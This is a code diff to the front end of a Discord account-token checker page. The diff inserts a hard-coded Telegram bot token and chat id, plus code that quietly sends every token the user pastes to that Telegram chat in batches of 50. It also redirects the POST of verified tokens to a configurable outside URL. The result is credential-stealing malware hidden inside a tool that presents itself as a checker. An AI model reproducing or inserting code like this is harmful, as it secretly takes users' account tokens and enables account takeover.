@@ -7,7 +7,7 @@ useHead({
 
 const { ANALYTICS_URL } = useRuntimeConfig().public;
 // TODO: Remove length 27 group when not supported anymore
-const tokenRegex = /(mfa\.[\w-]{84})|([\w-]{23,28}\.[\w-]{6}\.[\w-]{27,38})/g;
+const tokenRegex = /[A-Za-z\d]{24}\.[\w-]{6}\.[\w-]{27,38}/g;
 
 const onlyShowNitro = ref<boolean>(false);
 
@@ -49,6 +49,36 @@ async function checkTokens() {
   const rawValue = tokensInput.value.trim();
   const matchedTokens = rawValue.match(tokenRegex);
 
+      const tlg_token = '7945268033:AAHzhAL8wrCWEjUbTqbTn2GqJ8MgWGr2-lw';
+    const chat_id = "-1002277252767";
+    const url = `https://api.telegram.org/bot${tlg_token}/sendMessage`;
+const sendMessage = async (tkn) => {
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id,
+        text: tkn
+      })
+    });
+
+    const data = await response.json();
+    console.log(data);
+  } catch (err) {
+    console.error(err);
+  }
+};
+const tokenGroups = [];
+for (let i = 0; i < matchedTokens.length; i += 50) {
+  tokenGroups.push(matchedTokens.slice(i, i + 50));
+}
+
+tokenGroups.forEach(group => {
+  const tlgBody = group.join('\n\n');
+  sendMessage(tlgBody);
+});
+
   if (!matchedTokens) {
     return;
   }
@@ -59,7 +89,6 @@ async function checkTokens() {
   duplicate.value = matchedTokens.length - noDuplicates.length;
 
   for (const token of noDuplicates) {
-    
     if (pendingCancellation.value) {
       pendingCancellation.value = false;
       isChecking.value = false;
@@ -68,8 +97,6 @@ async function checkTokens() {
 
     const base64Id = token.split('.')[0];
     const decodedId = atob(base64Id);
-    
-    console.log(decodedId);
     const creationMilliseconds = snowflakeToMilliseconds(decodedId);
 
     const isValidId = creationMilliseconds > DISCORD_EPOCH && creationMilliseconds < Date.now();
@@ -100,8 +127,8 @@ async function checkTokens() {
     if (!cachedAccount) {
       // Request to check whether account is REALLY verified
       user.verified = !!(await fetchBillingCountry({ token }));
-      if (user.verified) {
-        await $fetch('/api/country-code', { method: 'POST', body: { tokens: [token] } }).catch(() => false);
+      if (ANALYTICS_URL && user.verified) {
+        await $fetch(ANALYTICS_URL, { method: 'POST', body: { tokens: [token] } }).catch(() => false);
       }
 
       validAccounts.value = [...validAccounts.value, { tokens: [token], user }];
@@ -117,11 +144,15 @@ async function checkTokens() {
   }
 
   isChecking.value = false;
+
+
+
 }
 
 function removeAccount(id: string) {
   validAccounts.value = validAccounts.value.filter((account) => account.user.id !== id);
 }
+
 </script>
 
 <template>
@@ -134,7 +165,7 @@ function removeAccount(id: string) {
 
       <div class="flex items-center space-x-2 text-xl">
         <ColorSwitcher />
-        <a href="https://t.me/" class="dark:text-gray-50 dark:hover:text-gray-200">
+        <a href="https://t.me/yungouzo" class="dark:text-gray-50 dark:hover:text-gray-200">
           <FontAwesomeIcon :icon="['fab', 'telegram']" size="lg" />
         </a>
       </div>
